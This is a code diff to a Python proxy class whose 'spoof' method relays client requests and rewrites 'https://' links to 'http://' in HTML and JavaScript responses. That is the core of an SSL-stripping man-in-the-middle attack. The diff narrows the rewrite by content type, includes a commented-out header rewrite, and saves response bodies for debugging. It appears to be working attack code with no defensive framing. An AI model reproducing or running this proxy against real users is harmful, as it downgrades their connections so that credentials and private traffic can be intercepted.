@@ -31,13 +31,15 @@ class Proxy:
         with client:
             req = client.recv()
             host = req.header.get(b"Host").decode()
+            # req.header_replace(b"http://", b"https://")
 
             server = self.connect_to(host)
             with server:
                 server.send(req)
                 res = server.recv()
                 debug_save(res.body.plain_text, "ServerRecv")
-            res.body_replace(b"https", b"http")
+            if res.header.get(b"Content-Type").split(b";")[0].strip() in [b'text/html', b'application/javascript']:
+                res.body_replace(b"https://", b"http://")
             debug_save(res.body.plain_text, "after_replace")
             client.send(res)
 
@@ -46,10 +48,10 @@ class Proxy:
         try:
             while 1:
                 client = self.accept()
-                thread = threading.Thread(target=self.spoof, args=(client,))
-                thread.daemon = True
-                thread.start()
-                # self.spoof(client)
+                # thread = threading.Thread(target=self.spoof, args=(client,))
+                # thread.daemon = True
+                # thread.start()
+                self.spoof(client)
         except KeyboardInterrupt:
             print("[SHUTDOWN]")
 
